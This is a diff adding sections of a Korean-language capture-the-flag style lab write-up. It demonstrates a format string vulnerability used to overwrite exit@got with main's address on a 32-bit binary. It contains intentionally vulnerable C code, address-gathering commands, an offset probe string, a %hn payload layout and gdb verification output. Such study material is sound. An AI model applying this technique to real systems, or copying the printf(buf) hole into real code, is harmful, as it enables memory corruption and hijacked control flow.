@@ -257,4 +257,219 @@ Partial RELRO 환경을 사용한다.
 
 ---
 
-## 7. 실습 환
+## 7. 실습 환경
+
+
+* Architecture: x86 (32-bit)
+* ASLR: ON
+* PIE: OFF
+* NX: ON
+* Stack Canary: OFF
+* RELRO: Partial RELRO
+
+PIE가 비활성화되어 있으므로,
+실행 파일의 코드 영역과 GOT 주소는 실행마다 고정된다.
+따라서 ASLR이 활성화되어 있어도
+본 실습에는 영향을 주지 않는다.
+
+---
+
+## 8. 취약 코드
+
+```c
+// vuln.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main() {
+    char buf[100];
+
+    setregid(getegid(), getegid());
+
+    puts("input:");
+    fgets(buf, sizeof(buf), stdin);
+    printf(buf);      // Format String Vulnerability
+
+    puts("done");
+    exit(0);          // GOT overwrite 대상
+}
+```
+
+### 취약점 요약
+
+* `printf(buf)`
+
+  * 사용자 입력이 포맷 문자열로 해석됨
+  * Format String Vulnerability 발생
+* `exit(0)`
+
+  * PLT → GOT를 통해 함수 호출
+  * GOT overwrite 시 호출 흐름 변경 가능
+
+---
+
+## 9. 공격 아이디어
+
+본 실습의 목표는
+**Format String Vulnerability를 이용해 `exit@got`을 overwrite하고,
+프로그램의 실행 흐름을 변경하는 것**이다.
+
+### overwrite 대상 선택
+
+* overwrite 대상 함수: `exit`
+* overwrite 대상 주소: `exit@got`
+* overwrite 값: `main` 함수 주소
+
+즉,
+
+```
+exit@got  →  main
+```
+
+으로 덮어써,
+`exit()` 호출 시 프로그램이 종료되지 않고
+다시 `main()`으로 점프하도록 만든다.
+
+---
+
+## 10. 주소 정보 수집
+
+### 10.1 `main` 함수 주소
+
+```bash
+objdump -d vuln | grep '<main>'
+```
+
+출력 예시:
+
+```
+ 80490cd:	e9 e4 00 00 00       	jmp    80491b6 <main>
+080491b6 <main>:
+```
+
+→ `main = 0x080491b6`
+
+### 10.2 `exit@got` 주소
+
+```bash
+readelf -r vuln | grep exit
+```
+
+출력 예시:
+
+```
+0804c014  00000707 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0
+```
+
+→ `exit@got = 0x0804c014`
+
+---
+
+## 11. Format String offset 계산
+
+다음 입력을 이용해,
+`printf` 기준으로 입력 문자열이 몇 번째 인자로 해석되는지 확인한다.
+
+```
+AAAA.%x.%x.%x.%x.%x.%x.%x.%x
+```
+
+출력 예시:
+
+```
+AAAA.64.f3c8c5c0.80491e0.ff9fe294.f3cb97de.804821c.41414141.2e78252e
+```
+
+`41414141`이 7번째 위치에서 관측되므로,
+
+```
+offset = 7
+```
+
+---
+
+## 12. GOT overwrite payload 구성
+
+### 12.1 overwrite 값 분해
+
+`main` 주소는 다음과 같다.
+
+```
+main = 0x080491b6
+```
+
+이를 2바이트 단위로 나누면:
+
+```
+low  = 0x91b6
+high = 0x0804
+```
+
+### 12.2 payload 구조
+
+```
+[ exit@got ][ exit@got+2 ]
+%pad1c %7$hn
+%pad2c %8$hn
+```
+
+* `%hn`을 이용해 2바이트씩 overwrite
+* 하위 바이트 → 상위 바이트 순서로 기록
+
+---
+
+## 13. 결과
+
+### 실행 결과
+
+payload를 입력한 후 실행 결과는 다음과 같다.
+
+![result](https://github.com/sage-502/pwnable-lab/blob/main/images/fsb-got-overwrite/01.png)
+
+`exit()` 호출 시 프로그램이 종료되지 않고
+`main()`으로 다시 점프하며,
+이로 인해 `main` 스택 프레임이 반복적으로 쌓여
+결국 segmentation fault가 발생한다.
+
+이는 `exit@got`이 성공적으로 overwrite되어
+함수 호출 흐름이 변경되었음을 의미한다.
+
+### gdb를 이용한 검증
+
+gdb에서 overwrite 전 `exit@got` 확인:
+
+```gdb
+(gdb) x/wx 0x0804c014
+0x804c014 <exit@got.plt>:	0x08049086
+```
+
+gdb에서 overwrite 후 `exit@got` 확인:
+
+```gdb
+(gdb) x/wx 0x0804c014
+0x0804c014 <exit@got.plt>: 0x080491b6
+```
+
+또한 `exit@plt`에서 단일 스텝 실행 시:
+
+```
+exit@plt → main
+```
+
+으로 점프하는 것을 확인할 수 있다.
+
+이는 PLT가 GOT에 저장된 주소를 그대로 신뢰하여
+제어 흐름이 변경되었음을 보여준다.
+
+실제 gdb 스샷: 
+![gdb](https://github.com/sage-502/pwnable-lab/blob/main/images/fsb-got-overwrite/03.png)
+
+---
+
+## 15. 정리
+
+* Format String Vulnerability를 이용해 GOT overwrite가 가능함을 확인했다.
+* Partial RELRO 환경에서는 `.got.plt` 영역이 쓰기 가능하다.
+* PLT는 판단 없이 GOT에 저장된 주소로 점프한다.
+* GOT overwrite는 함수 호출 흐름을 직접 변경할 수 있다.
